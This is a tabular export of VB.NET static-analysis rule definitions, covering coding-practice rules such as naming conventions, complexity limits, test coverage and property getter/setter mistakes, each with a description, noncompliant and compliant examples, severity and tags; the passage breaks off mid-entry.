2018-11-06T12:16:58+0100,"<p>Not surprisingly, the <code>SafeHandle.DangerousGetHandle</code> method is dangerous. That's because it may not return a valid handle. Using it can
lead to leaks and vulnerabilities. While it is possible to use the method successfully, it's extremely difficult to do correctly, so the method should
simply be avoided altogether.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Sub Dangerous(fieldInfo As System.Reflection.FieldInfo)
  Dim handle As SafeHandle = CType(fieldInfo.GetValue(fieldInfo), SafeHandle)
  Dim dangerousHandle As IntPtr = handle.DangerousGetHandle ' Noncompliant
End Sub
</pre>",vbnet:S3869,vbnet,VB.NET,"<p>Not surprisingly, the <code>SafeHandle.DangerousGetHandle</code> method is dangerous. That's because it may not return a valid handle. Using it can
lead to leaks and vulnerabilities. While it is possible to use the method successfully, it's extremely difficult to do correctly, so the method should
simply be avoided altogether.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Sub Dangerous(fieldInfo As System.Reflection.FieldInfo)
  Dim handle As SafeHandle = CType(fieldInfo.GetValue(fieldInfo), SafeHandle)
  Dim dangerousHandle As IntPtr = handle.DangerousGetHandle ' Noncompliant
End Sub
</pre>","""SafeHandle.DangerousGetHandle"" should not be called",[],BLOCKER,"['leak', 'unpredictable']",BUG
2018-11-06T12:16:58+0100,"<p>Properties provide a way to enforce encapsulation by providing <code>public</code>, <code>protected</code> or <code>internal</code> methods that
give controlled access to <code>private</code> fields. However in classes with multiple fields it is not unusual that cut and paste is used to quickly
create the needed properties, which can result in the wrong field being accessed by a getter or setter.</p>
<p>This rule raises an issue in any of these cases:</p>
<ul>
  <li> A setter does not update the field with the corresponding name. </li>
  <li> A getter does not access the field with the corresponding name. </li>
</ul>
<p>For simple properties it is better to use <a
href=""https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/classes-and-structs/auto-implemented-properties"">auto-implemented
properties</a> (C# 3.0 or later).</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class A
    Private x As Integer
    Private y As Integer

    Public Property X As Integer
        Get
            Return x
        End Get
        Set(ByVal value As Integer)
            x = value
        End Set
    End Property

    Public Property Y As Integer
        Get  ' Noncompliant: field 'y' is not used in the return value
            Return x
        End Get
        Set(ByVal value As Integer) ' Noncompliant: field 'y' is not updated
            x = value
        End Set
    End Property
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class A
    Private x As Integer
    Private y As Integer

    Public Property X As Integer
        Get
            Return x
        End Get
        Set(ByVal value As Integer)
            x = value
        End Set
    End Property

    Public Property Y As Integer
        Get
            Return y
        End Get
        Set(ByVal value As Integer)
            y = value
        End Set
    End Property
End Class
</pre>",vbnet:S4275,vbnet,VB.NET,"<p>Properties provide a way to enforce encapsulation by providing <code>public</code>, <code>protected</code> or <code>internal</code> methods that
give controlled access to <code>private</code> fields. However in classes with multiple fields it is not unusual that cut and paste is used to quickly
create the needed properties, which can result in the wrong field being accessed by a getter or setter.</p>
<p>This rule raises an issue in any of these cases:</p>
<ul>
  <li> A setter does not update the field with the corresponding name. </li>
  <li> A getter does not access the field with the corresponding name. </li>
</ul>
<p>For simple properties it is better to use <a
href=""https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/classes-and-structs/auto-implemented-properties"">auto-implemented
properties</a> (C# 3.0 or later).</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class A
    Private x As Integer
    Private y As Integer

    Public Property X As Integer
        Get
            Return x
        End Get
        Set(ByVal value As Integer)
            x = value
        End Set
    End Property

    Public Property Y As Integer
        Get  ' Noncompliant: field 'y' is not used in the return value
            Return x
        End Get
        Set(ByVal value As Integer) ' Noncompliant: field 'y' is not updated
            x = value
        End Set
    End Property
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class A
    Private x As Integer
    Private y As Integer

    Public Property X As Integer
        Get
            Return x
        End Get
        Set(ByVal value As Integer)
            x = value
        End Set
    End Property

    Public Property Y As Integer
        Get
            Return y
        End Get
        Set(ByVal value As Integer)
            y = value
        End Set
    End Property
End Class
</pre>",Getters and setters should access the expected fields,[],CRITICAL,['pitfall'],BUG
2015-10-13T10:34:16+0200,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,common-vbnet:InsufficientBranchCoverage,vbnet,VB.NET,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,Branches should have sufficient coverage by tests,"[{'key': 'minimumBranchCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2013-06-19T07:34:52+0200,An issue is created on a file as soon as there is at least one block of duplicated code on this file,common-vbnet:DuplicatedBlocks,vbnet,VB.NET,An issue is created on a file as soon as there is at least one block of duplicated code on this file,Source files should not have any duplicated blocks,[],MAJOR,['pitfall'],CODE_SMELL
2015-10-13T10:34:16+0200,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,common-vbnet:FailedUnitTests,vbnet,VB.NET,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,Failed unit tests should be fixed,[],MAJOR,[],BUG
2013-06-19T07:34:52+0200,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,common-vbnet:InsufficientCommentDensity,vbnet,VB.NET,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,Source files should have a sufficient density of comment lines,"[{'key': 'minimumCommentDensity', 'defaultValue': '25', 'type': 'FLOAT'}]",MAJOR,['convention'],CODE_SMELL
2015-10-13T10:34:16+0200,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,common-vbnet:InsufficientLineCoverage,vbnet,VB.NET,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,Lines should have sufficient coverage by tests,"[{'key': 'minimumLineCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2015-10-13T10:34:16+0200,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,common-vbnet:SkippedUnitTests,vbnet,VB.NET,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,Skipped unit tests should be either removed or fixed,[],MAJOR,['pitfall'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all class
names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Class foo ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Foo ' Compliant
End Class
</pre>",vbnet:S101,vbnet,VB.NET,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all class
names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Class foo ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Foo ' Compliant
End Class
</pre>",Class names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'Regular expression used to check the class names against.', 'defaultValue': '^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2016-11-07T15:36:18+0100,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,vbnet:S103,vbnet,VB.NET,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,Lines should not be too long,"[{'key': 'maximumLineLength', 'htmlDesc': 'The maximum authorized line length.', 'defaultValue': '200', 'type': 'INTEGER'}]",MAJOR,['convention'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>",vbnet:S104,vbnet,VB.NET,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>",Files should not have too many lines of code,"[{'key': 'maximumFileLocThreshold', 'htmlDesc': 'Maximum authorized lines in a file.', 'defaultValue': '1000', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>",vbnet:S105,vbnet,VB.NET,"<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>",Tabulation characters should not be used,[],MINOR,['convention'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>Complex boolean expressions are hard to read and so to maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3</p>
<pre>
If ((condition1 AndAlso condition2) OrElse (condition3 AndAlso condition4)) AndAlso condition5) Then  'Noncompliant
  ...
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If ((MyFirstCondition() OrElse MySecondCondition()) AndAlso MyLastCondition()) Then
  ...
End If
</pre>",vbnet:S1067,vbnet,VB.NET,"<p>Complex boolean expressions are hard to read and so to maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3</p>
<pre>
If ((condition1 AndAlso condition2) OrElse (condition3 AndAlso condition4)) AndAlso condition5) Then  'Noncompliant
  ...
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If ((MyFirstCondition() OrElse MySecondCondition()) AndAlso MyLastCondition()) Then
  ...
End If
</pre>",Expressions should not be too complex,"[{'key': 'max', 'htmlDesc': 'Maximum number of allowed conditional operators in an expression', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2017-11-14T07:57:44+0100,"<p>Hard coding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hard coded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hard-coded.</p>
<p>This rule raises an issue when URI's or path delimiters are hard coded.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",vbnet:S1075,vbnet,VB.NET,"<p>Hard coding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hard coded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hard-coded.</p>
<p>This rule raises an issue when URI's or path delimiters are hard coded.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",URIs should not be hardcoded,[],MINOR,['cert'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.</p>
<p>This rule allows to check that all interface names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Must start with an upper case 'I' character, e.g. IFoo </li>
  <li> Followed by Pascal casing, starting with an upper case character, e.g. IEnumerable </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. IFooID </li>
  <li> Longer abbreviations need to be lower cased, e.g. IFooHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^I([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Interface Foo  ' Noncompliant
End Interface
</pre>
<h2>Compliant Solution</h2>
<pre>
Interface IFoo ' Compliant
End Interface
</pre>",vbnet:S114,vbnet,VB.NET,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.</p>
<p>This rule allows to check that all interface names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Must start with an upper case 'I' character, e.g. IFoo </li>
  <li> Followed by Pascal casing, starting with an upper case character, e.g. IEnumerable </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. IFooID </li>
  <li> Longer abbreviations need to be lower cased, e.g. IFooHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^I([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Interface Foo  ' Noncompliant
End Interface
</pre>
<h2>Compliant Solution</h2>
<pre>
Interface IFoo ' Compliant
End Interface
</pre>",Interface names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'Regular expression used to check the interface names against.', 'defaultValue': '^I([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.This rule checks that all local variables
follow a naming convention.</p>
<p>The default configuration is:</p>
<ul>
  <li> Camel casing, starting with a lower case character, e.g. backColor </li>
  <li> Short abbreviations of 2 letters can be capitalized only when not at the beginning, e.g. id, productID </li>
  <li> Longer abbreviations need to be lower cased, e.g. html </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-z0-9]*([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Module Module1
    Sub Main()
        Dim Foo = 0 ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo = 0 ' Compliant
    End Sub
End Module
</pre>",vbnet:S117,vbnet,VB.NET,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.This rule checks that all local variables
follow a naming convention.</p>
<p>The default configuration is:</p>
<ul>
  <li> Camel casing, starting with a lower case character, e.g. backColor </li>
  <li> Short abbreviations of 2 letters can be capitalized only when not at the beginning, e.g. id, productID </li>
  <li> Longer abbreviations need to be lower cased, e.g. html </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-z0-9]*([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Module Module1
    Sub Main()
        Dim Foo = 0 ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo = 0 ' Compliant
    End Sub
End Module
</pre>",Local variable names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'Regular expression used to check the local variable names against.', 'defaultValue': '^[a-z][a-z0-9]*([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>Array designators should always be located on the type for better code readability. Otherwise, developers must look both at the type and the
variable name to know whether or not a variable is an array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo() As String ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo As String() ' Compliant
    End Sub
End Module
</pre>",vbnet:S1197,vbnet,VB.NET,"<p>Array designators should always be located on the type for better code readability. Otherwise, developers must look both at the type and the
variable name to know whether or not a variable is an array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo() As String ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo As String() ' Compliant
    End Sub
End Module
</pre>","Array designators ""()"" should be on the type, not the variable",[],MINOR,['convention'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim a = 0 : Dim b = 0  ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim a = 0              ' Compliant
        Dim b = 0              ' Compliant
    End Sub
End Module
</pre>",vbnet:S122,vbnet,VB.NET,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim a = 0 : Dim b = 0  ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim a = 0              ' Compliant
        Dim b = 0              ' Compliant
    End Sub
End Module
</pre>",Statements should be on separate lines,[],MAJOR,['style'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>While it is technically correct to assign to parameters from within method bodies, doing so before the parameter value is read is likely a bug.
Instead, initial values of parameters should be, if not treated as <code>readonly</code> then at least read before reassignment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Foo(ByVal a As Integer)
        a = 42                  ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Foo(ByVal a As Integer)
        Dim tmp = a
        tmp = 42
    End Sub
End Module
</pre>
<h2>Exceptions</h2>
<p><code>ByRef</code> parameters are ignored.</p>
<pre>
Module Module1
    Sub Foo(ByRef a As Integer)
        a = 42                  ' Ignored; it is a ByRef parameter
    End Sub
End Module
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 17.8 - A function parameter should not be modified </li>
</ul>",vbnet:S1226,vbnet,VB.NET,"<p>While it is technically correct to assign to parameters from within method bodies, doing so before the parameter value is read is likely a bug.
Instead, initial values of parameters should be, if not treated as <code>readonly</code> then at least read before reassignment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Foo(ByVal a As Integer)
        a = 42                  ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Foo(ByVal a As Integer)
        Dim tmp = a
        tmp = 42
    End Sub
End Module
</pre>
<h2>Exceptions</h2>
<p><code>ByRef</code> parameters are ignored.</p>
<pre>
Module Module1
    Sub Foo(ByRef a As Integer)
        a = 42                  ' Ignored; it is a ByRef parameter
    End Sub
End Module
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 17.8 - A function parameter should not be modified </li>
</ul>",Method parameters and caught exceptions should not be reassigned,[],MINOR,['misra'],BUG
2016-11-07T15:36:18+0100,"<p>Nested <code>If</code>, <code>Select</code>, <code>For</code>, <code>For Each</code>, <code>While</code>, <code>Do</code>, and <code>Try</code>
statements are key ingredients for making what's known as ""Spaghetti code"".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
If condition1 ' Compliant - depth = 1
  ' ...
  If condition2 ' Compliant - depth = 2
    ' ...
    For i = 0 to 10 ' Compliant - depth = 3, not exceeding the limit
      ' ...
      If condition4 ' Noncompliant - depth = 4
        If condition5 ' Depth = 5, exceeding the limit, but issues are only reported on depth = 4
          ' ...
        End If
        Return
      End If
    Next
  End If
End If
</pre>",vbnet:S134,vbnet,VB.NET,"<p>Nested <code>If</code>, <code>Select</code>, <code>For</code>, <code>For Each</code>, <code>While</code>, <code>Do</code>, and <code>Try</code>
statements are key ingredients for making what's known as ""Spaghetti code"".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
If condition1 ' Compliant - depth = 1
  ' ...
  If condition2 ' Compliant - depth = 2
    ' ...
    For i = 0 to 10 ' Compliant - depth = 3, not exceeding the limit
      ' ...
      If condition4 ' Noncompliant - depth = 4
        If condition5 ' Depth = 5, exceeding the limit, but issues are only reported on depth = 4
          ' ...
        End If
        Return
      End If
    Next
  End If
End If
</pre>","Control flow statements ""If"", ""For"", ""For Each"", ""Do"", ""While"", ""Select"" and ""Try"" should not be nested too deeply","[{'key': 'maximumNestingLevel', 'htmlDesc': 'Maximum allowed control flow statement nesting depth.', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be
really readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of
the code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.
Comments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default comment pattern <code>^'\s*\S+\s*$</code>, which ignores single word comments:</p>
<pre>
Module Module1
  Sub Main()
    Console.WriteLine(""Hello, world!"") ' Noncompliant - My first program!
    Console.WriteLine(""Hello, world!"") ' CompliantOneWord
  End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
  Sub Main()
    ' Compliant - My first program!
    Console.WriteLine(""Hello, world!"")
    Console.WriteLine(""Hello, world!"") ' CompliantOneWord
  End Sub
End Module
</pre>",vbnet:S139,vbnet,VB.NET,"<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be
really readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of
the code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.
Comments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default comment pattern <code>^'\s*\S+\s*$</code>, which ignores single word comments:</p>
<pre>
Module Module1
  Sub Main()
    Console.WriteLine(""Hello, world!"") ' Noncompliant - My first program!
    Console.WriteLine(""Hello, world!"") ' CompliantOneWord
  End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
  Sub Main()
    ' Compliant - My first program!
    Console.WriteLine(""Hello, world!"")
    Console.WriteLine(""Hello, world!"") ' CompliantOneWord
  End Sub
End Module
</pre>",Comments should not be located at the end of lines of code,"[{'key': 'legalCommentPattern', 'htmlDesc': 'Pattern for text of trailing comments that are allowed.', 'defaultValue': ""^'\\s*\\S+\\s*$"", 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>The cyclomatic complexity of a function, procedure or property should not exceed a defined threshold. Complex code can perform poorly and will in
any case be difficult to understand and therefore to maintain.</p>",vbnet:S1541,vbnet,VB.NET,"<p>The cyclomatic complexity of a function, procedure or property should not exceed a defined threshold. Complex code can perform poorly and will in
any case be difficult to understand and therefore to maintain.</p>","Functions, procedures and properties should not be too complex","[{'key': 'maximumFunctionComplexityThreshold', 'htmlDesc': 'The maximum authorized complexity.', 'defaultValue': '10', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all subroutine and function names match a provided regular
expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
  <li> Event handlers with a handles clause and two-parameter methods with <code>EventArgs</code> second parameter are not covered by this rule. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code></p>
<pre>
Module Module1
  Sub bad_subroutine()                      ' Noncompliant
  End Sub

  Public Function Bad_Function() As Integer ' Noncompliant
    Return 42
  End Function
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
  Sub GoodSubroutine()                      ' Compliant
  End Sub

  Public Function GoodFunction() As Integer ' Compliant
    Return 42
  End Function
End Module
</pre>",vbnet:S1542,vbnet,VB.NET,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all subroutine and function names match a provided regular
expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
  <li> Event handlers with a handles clause and two-parameter methods with <code>EventArgs</code> second parameter are not covered by this rule. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code></p>
<pre>
Module Module1
  Sub bad_subroutine()                      ' Noncompliant
  End Sub

  Public Function Bad_Function() As Integer ' Noncompliant
    Return 42
  End Function
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
  Sub GoodSubroutine()                      ' Compliant
  End Sub

  Public Function GoodFunction() As Integer ' Compliant
    Return 42
  End Function
End Module
</pre>",Functions and procedures should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'Regular expression used to check the function names against.', 'defaultValue': '^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$', 'type': 'STRING'}]",MAJOR,['convention'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p><code>StringBuilder</code> is more efficient than string concatenation, especially when the operator is repeated over and over as in loops.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo = """"
        foo &amp;= ""Result: ""       ' Compliant - outside of loop

        For i = 1 To 9
            foo &amp;= i            ' Noncompliant
        Next
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo = New System.Text.StringBuilder
        foo.Append(""Result: "")  ' Compliant

        For i = 1 To 9
            foo.Append(i)       ' Compliant
        Next
    End Sub
End Module
</pre>",vbnet:S1643,vbnet,VB.NET,"<p><code>StringBuilder</code> is more efficient than string concatenation, especially when the operator is repeated over and over as in loops.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo = """"
        foo &amp;= ""Result: ""       ' Compliant - outside of loop

        For i = 1 To 9
            foo &amp;= i            ' Noncompliant
        Next
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo = New System.Text.StringBuilder
        foo.Append(""Result: "")  ' Compliant

        For i = 1 To 9
            foo.Append(i)       ' Compliant
        Next
    End Sub
End Module
</pre>","Strings should not be concatenated using ""+"" or ""&"" in a loop",[],MINOR,['performance'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>Consistently using the <code>&amp;</code> operator for string concatenation make the developer intentions clear.</p>
<p><code>&amp;</code>, unlike <code>+</code>, will convert its operands to strings and perform an actual concatenation.</p>
<p><code>+</code> on the other hand can be an addition, or a concatenation, depending on the operand types.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Console.WriteLine(""1"" + 2) ' Noncompliant - will display ""3""
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Console.WriteLine(1 &amp; 2)   ' Compliant - will display ""12""
        Console.WriteLine(1 + 2)   ' Compliant - but will display ""3""
        Console.WriteLine(""1"" &amp; 2) ' Compliant - will display ""12""
    End Sub
End Module
</pre>",vbnet:S1645,vbnet,VB.NET,"<p>Consistently using the <code>&amp;</code> operator for string concatenation make the developer intentions clear.</p>
<p><code>&amp;</code>, unlike <code>+</code>, will convert its operands to strings and perform an actual concatenation.</p>
<p><code>+</code> on the other hand can be an addition, or a concatenation, depending on the operand types.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Console.WriteLine(""1"" + 2) ' Noncompliant - will display ""3""
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Console.WriteLine(1 &amp; 2)   ' Compliant - will display ""12""
        Console.WriteLine(1 + 2)   ' Compliant - but will display ""3""
        Console.WriteLine(""1"" &amp; 2) ' Compliant - will display ""12""
    End Sub
End Module
</pre>","The ""&"" operator should be used to concatenate strings",[],CRITICAL,['suspicious'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.</p>
<p>This rule allows to check that all parameter names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Camel casing, starting with a lower case character, e.g. backColor </li>
  <li> Short abbreviations of 2 letters can be capitalized only when not at the beginning, e.g. id, productID </li>
  <li> Longer abbreviations need to be lower cased, e.g. html </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-z0-9]*([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code></p>
<pre>
Module Module1
